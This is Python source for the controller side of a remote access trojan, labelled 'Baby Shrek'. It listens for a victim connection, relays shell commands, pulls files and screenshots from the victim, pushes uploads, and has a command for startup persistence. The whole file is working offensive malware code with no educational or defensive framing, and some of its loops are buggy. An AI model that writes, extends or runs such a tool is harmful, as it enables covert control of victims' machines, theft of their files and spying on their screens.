from socket import *
import sys
from random import randint 
import time
import os
import datetime


buf=1024*1024
host='0.0.0.0'
port=1212


s=socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print(f'Listening At :{datetime.datetime.now()}')
client, addr=s.accept()
print(f'Connected At: {datetime.datetime.now()} address:{addr}')

cwd=client.recv(buf).decode()
print(f'{cwd}#> Current Directory ')

print('''

       B A B Y                     S H R E K    

                                     .-.                
            ,                     .-' ,c'.              
         __rK                    _)a  7  ;              
        /  ~,)                  (_,      (              
      _;   /a(                   |_.    :'\             
      L/\.'__/                   \       ' )nnnK-.      
      S  / (_                  .- L,-'   .dHHHb   |     
      S( '\_\\                / dHb'----'dHHHHb    \    
      S \  ,  )      _,-._   / dHHHb"x.dHHHHHHb     \           
      S |'. '.______/_U/_ '.-z/dHHHp   'dHHHHHb\     |          
     [H |  '..___.--'._C__  ) |         dHHHHHHb\ _   \         
     /| |_  | \     L/'--._/_ ;                  k '  /         
     |//- '-. ---.__         '|                 /     |         
      (       '-.   '.        |               _'-.  _/          
  .."' `.,  _ ,  :  | \      _\             ,/ ,  '/            
."       ':   .     : |   .-' '',          : |/(/\]/            
          \  /:  '  | :  /_      '...... .'/      |             
           |     |  : / .' '--.__,     __.'\      /             
           |   : ;  |/ |         '----'L,  |     /              
            \  : .   \  '-.________ /   ]  |____/               
    snd     L_____'..'           _.7' _/  <,    > 
                                <___.'     /    \ 
                                           \____/ 
                                                       ____     _____  
    ''')


while True:
    
    cmd=input(f'{cwd}#> ')
    splited=cmd.split()
    if cmd.strip()=='':
        continue
        
        
    client.send(cmd.encode('utf-8'))
    
    shell=client.recv(buf).decode('utf-8')
    
    result, cwd=shell.split('<sep>')
    
    print(result)
    
    # Exit Command 
    
    if splited[0].lower()=='exit':
        
        exit()
    
    # 1 Download files Command
    
    if splited[0].lower()=='down':
        
        try:
            os.system('cls')
        except:
            os.system('clear')
    
        s1=socket(AF_INET, SOCK_STREAM)
        s1.bind(('0.0.0.0', 2626))
        
        s1.listen(1)
        sexy, address = s1.accept()
        print('[*] New Connection is Established . . Address: ',address)
        
        file=input('<< OutPut File Name Path #=>> ')
        
        f=open(file, 'wb')
        
        i=1
        z=1024
        while True:
            
            
            while (i):
            
                i=sexy.recv(1024*1024)
                z=z*6
                
                while (i):
                
                    f.write(i)
                    i=sexy.recv(1024*1024)

                    if  z < 1024*10 :pass
            break
        print(' <=-- Completed --=>')
        f.close()
        s1.close()
        
    # 2 Send Beep Message/Sound
    
    if splited[0].lower()=='beep':
        
        try:
            os.system('cls')
        except:
            os.system('clear')
        
        print('[*] Beep Message Sent . . .')
        
    # 3 Screen Shot Command/ Take And Receive
    
    if splited[0].lower()=='screen':
        
        try:
            os.system('cls')
        except:
            os.system('clear')
    
        s1=socket(AF_INET, SOCK_STREAM)
        s1.bind(('0.0.0.0', 2626))
        
        s1.listen(1)
        sexy, address = s1.accept()
        print('New Connection is Established . . Address: ',address)
        
        file=str(randint(1,1000))+'.png'
        
        f=open(file, 'wb')
        
        i=1
        z=1020
        while True:
            
            
            while (i):
            
                i=sexy.recv(1024*1024)
                z=z*2
                
                while (i):
                
                    f.write(i)
                    i=sexy.recv(1024*1024)

                    if  z < 1024*4 :pass
            break
        print(' <=-- Completed --=>')
        f.close()
        s1.close()
        
    # 4 Upload Files Command
    
    def upload():
    
        if splited[0].lower()=='up':
            
            try:
                os.system('cls')
            except:
                os.system('clear')
    
    
            s1=socket(AF_INET, SOCK_STREAM)
            s1.connect(('127.0.0.1', 2626))
            print('[+]New Connection is Established . .')
            
            file=splited[1]
            f=open(file, 'rb')
            
            i=f.read(1024*1024)
            
            while (i):
                s1.send(i)
                i=f.read(1024*1024)
            
            s1.close()
            print('[*] Completed . .')

    upload()
    
    # 5 StartUp Message 
    
    if splited[0].lower()=='startup':
        
        try:
            os.system('cls')
        except:
            os.system('clear')
            
        print('[+] File Added To StartUp . . .')
            
        